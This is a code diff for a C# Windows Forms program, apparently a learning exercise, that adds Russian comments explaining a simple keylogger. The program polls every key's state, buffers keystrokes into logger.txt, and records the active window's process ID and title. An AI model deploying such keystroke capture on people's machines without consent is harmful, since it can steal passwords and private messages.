@@ -16,20 +16,26 @@ namespace WindowsFormsApp_07._03._25
 {
     public partial class Form1: Form
     {
+        // Импорт библиотек Windows API:
         [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(Int32 vKey);
+        private static extern short GetAsyncKeyState(Int32 vKey);            // получает состояние клавиши без ожидания нажатия 
         [DllImport("user32.dll")]
-        public static extern IntPtr GetForegroundWindow();
+        public static extern IntPtr GetForegroundWindow();                // возвращает указатель на окно, находящееся в фокусе
         [DllImport("user32.dll")]
-        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);
+        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid); //извлекает ID процесса текущего окна
 
         public String buf = "";
            
         public Form1()
         {
             InitializeComponent();
-            timer1.Start();
-            timer2.Start();
+
+            // Запускаются два таймера для параллельного мониторинга
+            // Определяется текущая локаль системы
+            // Сохраняются код языка и его название
+
+            timer1.Start();  // Мониторинг клавиатуры
+            timer2.Start();  // Отслеживание окон
 
             CultureInfo culture = CultureInfo.CurrentCulture;
 
@@ -41,8 +47,14 @@ namespace WindowsFormsApp_07._03._25
             richTextBox2.Text += "Название кода: " + languageName + "\n";
         }
 
+        // Мониторинг клавиатуры
         private void timer1_Tick_1(object sender, EventArgs e)
         {
+            // Проверяет состояние всех клавиш(7 - 255)
+            // Записывает нажатые клавиши в текстовое поле
+            // Накапливает текст в буфере
+            // Автоматически сохраняет буфер при достижении размера в 20 символов
+
             for (int key = 7; key < 256; key++)
             {
                 int state = GetAsyncKeyState(key);
@@ -55,6 +67,7 @@ namespace WindowsFormsApp_07._03._25
                 }
             }
 
+            // Запись буфера при достижении размера
             if (buf.Length > 20)
             {
                 WriteToTxt(buf);
@@ -63,17 +76,28 @@ namespace WindowsFormsApp_07._03._25
 
         }
 
+        // Отслеживание окон
         private void timer2_Tick_1(object sender, EventArgs e)
         {
-            IntPtr h = GetForegroundWindow();
+            // Постоянно отслеживает активное окно
+            // Извлекает информацию о процессе
+            // Отображает ID и заголовок окна
+
+            IntPtr h = GetForegroundWindow();     // Получаем активное окно
             int pid = 0;
-            GetWindowThreadProcessId(h, ref pid);
-            Process p = Process.GetProcessById(pid);
+            GetWindowThreadProcessId(h, ref pid);   // Получаем ID процесса
+            Process p = Process.GetProcessById(pid);     // Находим процесс
             richTextBox2.Text += "id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n";
 
         }
 
-        private void WriteToTxt(string value) {
+        // Сохранение данных
+        private void WriteToTxt(string value) 
+        {
+            // Записывает накопленный текст в файл logger.txt
+            // Использует режим добавления(append mode)
+            // Закрывает поток после записи
+
             StreamWriter stream = new StreamWriter("./logger.txt", true);
             stream.Write(value);
             stream.Close();        }
